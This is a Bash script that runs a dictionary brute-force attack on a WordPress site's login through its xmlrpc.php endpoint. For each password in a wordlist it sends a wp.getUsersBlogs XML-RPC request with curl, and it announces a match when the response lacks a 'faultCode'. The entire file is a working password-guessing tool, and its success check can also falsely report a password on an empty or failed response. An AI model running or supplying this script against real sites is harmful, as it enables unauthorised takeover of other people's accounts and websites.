#!/bin/bash

if [ $# -ne 3 ]
then
        echo "Error: Incorrect syntax"
        echo "Usage: $0 <username> <ip-adress> <dictionary-route>"
        exit 2
else

if [ ! -f "$3" ]; then
    echo "Error: The dictionary '$3' does not exist."
    exit 3
fi

function salir(){
        echo "Terminated by user."
        exit 1
}

trap salir SIGINT 

for password in $(cat "$3"); do
        xml_data=$(cat <<FIN
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>$1</value></param>
<param><value>$password</value></param>
</params>
</methodCall>
FIN
        )

        echo -e "$xml_data" >> enviar.xml
        echo -e "[+] Password tested: $password"

        curl -s -X POST "http://$2/xmlrpc.php" -d@enviar.xml >> log.log

        if [ ! "$(cat log.log | grep 'faultCode')" ]; then
                echo -e "[+] The password for $1 is: $password"
                exit 0
        fi

        sleep 1

rm log.log enviar.xml

done
fi